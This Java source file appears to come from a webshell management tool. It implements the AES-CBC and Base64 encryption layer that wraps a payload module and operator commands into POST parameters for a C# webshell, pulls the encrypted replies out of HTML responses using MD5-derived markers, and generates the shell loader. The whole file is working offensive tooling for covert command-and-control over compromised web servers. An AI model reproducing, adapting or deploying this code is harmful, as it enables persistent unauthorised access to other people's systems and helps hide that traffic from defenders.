package shells.cryptions.cshapAes;

import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import util.Log;
import util.functions;
import util.http.Http;

public class CShapAesBase64Ex implements Cryption {
   private ShellEntity shell;
   private Http http;
   private Cipher decodeCipher;
   private Cipher encodeCipher;
   private String key;
   private boolean state;
   private byte[] payload;
   private String findStrLeft;
   private String pass;
   private String findStrRight;

   public void init(ShellEntity context) {
      this.shell = context;
      this.http = this.shell.getHttp();
      this.key = this.shell.getSecretKeyX();
      this.pass = this.shell.getPassword();
      String findStrMd5 = functions.md5(this.pass + this.key);
      this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
      this.findStrRight = findStrMd5.substring(16).toUpperCase();

      try {
         this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
         this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
         this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
         this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
         this.payload = this.shell.getPayloadModule().getPayload();
         if (this.payload != null) {
            this.state = true;
         } else {
            Log.error("payload Is Null");
         }

      } catch (Exception var4) {
         Log.error((Throwable)var4);
      }
   }

   public byte[] encode(byte[] data) {
      try {
         return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(this.payload))) + "&" + this.pass + "c=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
      } catch (Exception var3) {
         Log.error((Throwable)var3);
         return null;
      }
   }

   public byte[] decode(byte[] data) {
      try {
         data = functions.base64Decode(this.findStr(data));
         return this.decodeCipher.doFinal(data);
      } catch (Exception var3) {
         Log.error((Throwable)var3);
         return null;
      }
   }

   public String findStr(byte[] respResult) {
      String htmlString = new String(respResult);
      return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
   }

   public boolean isSendRLData() {
      return true;
   }

   public boolean check() {
      return this.state;
   }

   public byte[] generate(String password, String secretKey) {
      return Generate.GenerateShellLoder("csharpShellEx", password, functions.md5(secretKey).substring(0, 16), false);
   }
}
